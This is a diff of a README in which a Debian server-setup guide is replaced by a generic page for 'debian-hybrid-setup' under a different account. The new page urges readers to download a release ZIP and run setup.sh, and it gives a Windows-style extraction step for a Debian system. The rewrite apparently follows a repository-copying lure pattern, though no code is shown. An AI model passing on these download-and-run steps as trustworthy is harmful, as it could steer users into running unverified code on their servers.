@@ -1,44 +1,74 @@
-![Debian Logo](assets/logo.png "Debian logo") Debian Server                                                                                                         
-===============================
+# 🚀 debian-hybrid-setup - Simplify Your Debian Server Setup
 
-# Debian Server Setup Guide (Debian 12/13)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/johnny97-cloud/debian-hybrid-setup/releases)
 
-**A complete, modern guide and script collection for setting up a secure Debian server from scratch – 2025 edition**
+## 📚 Overview
 
-This repository provides **step-by-step documentation** and **safe, tested Bash scripts** to turn a fresh Debian 12 (Bookworm) or Debian 13 (Trixie) installation into a secure, production-ready server with common services (Apache, PHP, MariaDB, Bind9, Samba, NFS, etc.).
+Welcome to the **debian-hybrid-setup** repository! This project provides easy-to-use Bash scripts and powerful Ansible playbooks that help you set up a modern Debian 13 server. Whether you are bootstrapping your home lab or setting up a production environment, our tools streamline the process. The setup includes secure configurations for Samba, NFS, Apache, MariaDB, SSH, and more, using industry-standard hardening practices.
 
-Whether you're setting up a home lab, VPS, or small business server, this project helps you do it quickly and securely.
+## 🚀 Getting Started
 
-### Purpose of This Repo
+### 📥 Download & Install
 
-- Teach and automate best-practice Debian server configuration in 2025
-- Provide **reliable, idempotent scripts** for common tasks (hardening, service installation)
-- Offer a **clear, beginner-friendly guide** (GUIDE.md) explaining every step and why it matters
-- Combine automation with learning – run scripts for speed or follow manually for understanding
-- Modern replacement for outdated server setup repos (many are 8+ years old)
+To get started with **debian-hybrid-setup**, you will need to visit the Releases page to download the latest version. Click the link below to access it:
 
-### Features
+[Download Latest Release](https://github.com/johnny97-cloud/debian-hybrid-setup/releases)
 
-- Full written guide from fresh install to advanced services
-- Simple Bash scripts organized by service
-- Security-first approach (SSH hardening, UFW firewall, Fail2Ban, auto-updates)
-- Easy one-command testing via Podman (for developers)
-- Supports both Debian 12 and 13
-- Future-ready: will add Ansible playbooks later
+After downloading, follow these steps to set up your server:
 
-### How to Use This Repo
+1. **Extract the Downloaded Files:** Locate the downloaded ZIP file. Right-click and select "Extract All" to unpack the files.
 
-#### Option 1: Quick Start (Recommended for most users)
+2. **Open Terminal:** Open a terminal on your Debian system.
 
-After installing Debian (minimal + OpenSSH server enabled):
+3. **Navigate to the Folder:** Use the `cd` command to go to the folder where you extracted the files.
 
-```bash
-# Log in as root or your initial user with sudo
-sudo apt update && sudo apt install -y git curl
+4. **Run the Setup Script:** Execute the setup script by typing `bash setup.sh` and pressing Enter. Follow the on-screen instructions to complete the installation.
 
-# Clone the repo
-git clone https://github.com/idhirandar/debian-server-guide.git
-cd debian-server-guide
+### 🔧 System Requirements
 
-# Run the basic setup first (highly recommended)
-sudo bash setup-basic.sh
+To run **debian-hybrid-setup**, ensure your system meets the following requirements:
+
+- A Debian 13 server or compatible version.
+- Access to the internet for downloading packages.
+- Sufficient disk space (at least 10 GB recommended).
+
+## 🛠 Features
+
+- **Easy Bash Scripts:** Simple scripts that automate repetitive tasks.
+- **Powerful Ansible Playbooks:** Automate the deployment and configuration of your server environment.
+- **Secure Configurations:** Enhance security for Samba, NFS, Apache, MariaDB, and SSH using best practices.
+
+## ⚙️ How to Use
+
+1. **Configure Your Preferences:** Open the configuration files included in the setup. Each file comes with comments that guide you through the settings.
+
+2. **Run Automated Tasks:** Use the provided scripts and playbooks for tasks like setting up Samba shares or configuring Apache.
+
+3. **Monitor Server Performance:** Utilize built-in tools to assess the performance and security settings of your server.
+
+## 🔍 Understanding the Scripts
+
+Each script in the **debian-hybrid-setup** repository is designed to perform specific tasks. Here’s a quick overview:
+
+- **setup.sh:** The main script to initialize the setup.
+- **configure_samba.sh:** Configures Samba shares for file sharing.
+- **configure_apache.sh:** Sets up Apache to serve web pages.
+- **security_harden.sh:** Applies hardening settings to improve security.
+
+## ⚡ Tips for Success
+
+- **Backup Your Data:** Always back up your important data before running any scripts.
+- **Read Through Configurations:** Pay attention to configuration files to ensure your server meets your specific needs.
+- **Check Logs Regularly:** Monitor logs to stay informed about server performance and potential issues.
+
+## 🔗 Important Links
+
+- [Releases Page](https://github.com/johnny97-cloud/debian-hybrid-setup/releases)  
+- [Documentation](https://github.com/johnny97-cloud/debian-hybrid-setup/docs)  
+- [Issues Tracker](https://github.com/johnny97-cloud/debian-hybrid-setup/issues)
+
+## 🙋‍♂️ Getting Help
+
+If you encounter any issues or have questions, please check the [Issues Tracker](https://github.com/johnny97-cloud/debian-hybrid-setup/issues) for solutions. You can also submit your questions or bugs there.
+
+Thank you for using **debian-hybrid-setup**! We hope this tool makes your server setup easier and more efficient.
